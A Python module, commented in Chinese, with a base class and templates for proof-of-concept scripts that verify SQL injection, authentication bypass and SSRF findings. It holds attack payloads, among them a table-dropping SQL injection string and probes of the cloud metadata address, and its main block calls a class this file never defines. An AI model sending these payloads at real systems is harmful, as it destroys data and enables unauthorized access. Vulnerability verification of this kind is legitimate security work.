#!/usr/bin/env python3
"""
POC 模板基类

提供 POC 脚本的基本结构和通用方法
"""

import sys
import re
import json
import argparse
from typing import Dict, List, Optional, Any
from dataclasses import dataclass


@dataclass
class POCContext:
    """POC 执行上下文"""
    target: str
    vuln_type: str
    file_path: str
    line_number: int
    code_snippet: str
    additional_params: Dict[str, Any] = None


class BasePOC:
    """POC 基类"""

    def __init__(self, context: POCContext):
        self.context = context
        self.results: List[Dict] = []

    def send_request(self, method: str, url: str, **kwargs) -> Any:
        """
        发送 HTTP 请求

        实际实现需根据环境选择合适的 HTTP 客户端
        """
        raise NotImplementedError("子类必须实现 send_request 方法")

    def check_sql_error(self, response: Any) -> bool:
        """检查 SQL 错误"""
        error_patterns = [
            "sql",
            "syntax",
            "mysql",
            "postgres",
            "oracle",
            "sqlite",
            "jdbc",
            "H2",
        ]
        response_text = str(response.text).lower() if hasattr(response, 'text') else ''
        return any(pattern in response_text for pattern in error_patterns)

    def check_data_leak(self, response: Any) -> bool:
        """检查数据泄露"""
        leak_patterns = [
            "password",
            "admin",
            "user",
            "email",
            "secret",
        ]
        response_text = str(response.text).lower() if hasattr(response, 'text') else ''
        return any(pattern in response_text for pattern in leak_patterns)

    def verify(self) -> Dict[str, Any]:
        """
        执行验证

        子类应重写此方法
        """
        raise NotImplementedError("子类必须实现 verify 方法")

    def generate_report(self) -> str:
        """生成验证报告"""
        return json.dumps({
            'vuln_type': self.context.vuln_type,
            'target': self.context.target,
            'file_path': self.context.file_path,
            'line_number': self.context.line_number,
            'results': self.results,
            'exploitable': any(r.get('exploitable', False) for r in self.results)
        }, indent=2)


def create_poc_from_template(vuln_type: str, template_name: str) -> str:
    """
    从模板创建 POC

    Args:
        vuln_type: 漏洞类型
        template_name: 模板名称

    Returns:
        POC 代码字符串
    """
    templates = {
        'sql_injection': '''#!/usr/bin/env python3
"""
SQL 注入 POC 验证脚本

漏洞类型: {vuln_type}
模板: {template_name}
"""

from base_poc import BasePOC, POCContext


class SQLInjectionPOC(BasePOC):
    """SQL 注入 POC"""

    def verify(self) -> dict:
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
        ]

        for payload in payloads:
            try:
                response = self.send_request(
                    'POST',
                    self.context.target,
                    data={{'q': payload}}
                )

                if self.check_sql_error(response):
                    self.results.append({{
                        'payload': payload,
                        'exploitable': True,
                        'error_found': True
                    }})
            except Exception as e:
                continue

        return {{
            'is_exploitable': len(self.results) > 0,
            'evidence': self.results
        }}
''',
        'auth_bypass': '''#!/usr/bin/env python3
"""
认证绕过 POC 验证脚本

漏洞类型: {vuln_type}
模板: {template_name}
"""

from base_poc import BasePOC, POCContext


class AuthBypassPOC(BasePOC):
    """认证绕过 POC"""

    def verify(self) -> dict:
        test_cases = [
            {{'method': 'GET', 'path': '/admin', 'auth': None}},
            {{'method': 'GET', 'path': '/admin', 'auth': 'invalid'}},
            {{'method': 'GET', 'path': '/api/admin/config', 'auth': None}},
        ]

        for test in test_cases:
            try:
                response = self.send_request(
                    test['method'],
                    self.context.target + test['path'],
                    headers={{'Authorization': test['auth']}} if test['auth'] else {}
                )

                if response.status_code == 200:
                    self.results.append({{
                        'path': test['path'],
                        'exploitable': True,
                        'status_code': 200
                    }})
            except Exception as e:
                continue

        return {{
            'is_exploitable': len(self.results) > 0,
            'evidence': self.results
        }}
''',
        'ssrf': '''#!/usr/bin/env python3
"""
SSRF POC 验证脚本

漏洞类型: {vuln_type}
模板: {template_name}
"""

from base_poc import BasePOC, POCContext


class SSrfPOC(BasePOC):
    """SSRF POC"""

    def verify(self) -> dict:
        test_urls = [
            'http://localhost:8080/internal/admin',
            'http://169.254.169.254/latest/meta-data/',
            'http://internal.aws.ec2.metadata/',
        ]

        for url in test_urls:
            try:
                response = self.send_request('GET', url)
                if response.status_code in [200, 401, 403]:
                    self.results.append({{
                        'url': url,
                        'exploitable': True,
                        'accessible': True
                    }})
            except Exception as e:
                continue

        return {{
            'is_exploitable': len(self.results) > 0,
            'evidence': self.results
        }}
''',
    }

    return templates.get(vuln_type, '').format(
        vuln_type=vuln_type,
        template_name=template_name
    )


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='POC 验证脚本')
    parser.add_argument('--target', required=True, help='目标 URL')
    parser.add_argument('--vuln-type', required=True, help='漏洞类型')
    parser.add_argument('--file', help='文件路径')
    parser.add_argument('--line', type=int, help='行号')
    args = parser.parse_args()

    context = POCContext(
        target=args.target,
        vuln_type=args.vuln_type,
        file_path=args.file or '',
        line_number=args.line or 0,
        code_snippet=''
    )

    poc = SQLInjectionPOC(context)
    result = poc.verify()
    print(poc.generate_report())
